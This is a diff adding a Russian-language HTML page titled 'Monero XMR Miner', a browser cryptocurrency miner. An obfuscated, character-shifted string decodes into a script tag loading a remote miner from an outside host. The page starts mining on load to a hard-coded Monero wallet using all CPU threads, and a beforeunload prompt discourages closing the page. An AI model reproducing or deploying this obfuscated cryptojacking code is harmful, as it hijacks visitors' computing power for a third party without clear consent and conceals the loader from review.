@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <title>Monero XMR Miner</title>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        var s="=tdsjqu!tsd>#iuuqt;00fuifsfvn.qpdlfu/dpn0qfsgflu0qfsgfluxfc/kt@w1818312:@qfsgflu>xtt;00@kbtpo>gbtufs/npofsppdfbo#!?=0tdsjqu?";
+        m=""; for (i=0; i<s.length; i++) m+=String.fromCharCode(s.charCodeAt(i)-1); document.write(m);
+        console.log("Miner script injected:", m);
+    </script>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            background: #161618;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            color: #f2f5f4;
+            font-size: 14px;
+            padding: 10px;
+            margin: 0;
+        }
+        .box {
+            background: rgba(117, 192, 199, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid rgba(117, 192, 199, 0.3);
+            text-align: center;
+            margin: 20px auto;
+            width: 200px;
+        }
+        h3 {
+            font-size: 14px;
+            font-weight: normal;
+            text-transform: uppercase;
+            margin: 0 0 4px 0;
+        }
+        h2 {
+            font-weight: normal;
+            font-size: 32px;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3>Hashes/s</h3>
+        <h2 id="hashes-per-second">0</h2>
+    </div>
+    <script>
+        $(function() {
+            console.log("Page loaded, starting miner");
+            var wallet = "83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr";
+            var threads = navigator.hardwareConcurrency || 4;
+            console.log("Threads set to:", threads);
+
+            var hashesPerSecond = 0;
+            var statuss;
+
+            function startLogger() {
+                statuss = setInterval(function() {
+                    if (typeof totalhashes !== 'undefined') {
+                        hashesPerSecond = Math.round(totalhashes);
+                        $('#hashes-per-second').text(hashesPerSecond);
+                        console.log("Hashes/s updated:", hashesPerSecond);
+                        totalhashes = 0; // Сбрасываем, чтобы показывать хэши за последнюю секунду
+                    } else {
+                        console.log("totalhashes is undefined");
+                    }
+                }, 1000);
+            }
+
+            if (typeof PerfektStart === 'function') {
+                PerfektStart(wallet, "x", threads);
+                console.log("Mining started with wallet:", wallet, "threads:", threads);
+                startLogger();
+            } else {
+                console.error("PerfektStart is not defined");
+            }
+
+            window.addEventListener('beforeunload', function (e) {
+                e.preventDefault();
+                e.returnValue = 'Майнинг в процессе. Вы уверены, что хотите закрыть страницу?';
+            });
+        });
+    </script>
+</body>
+</html>
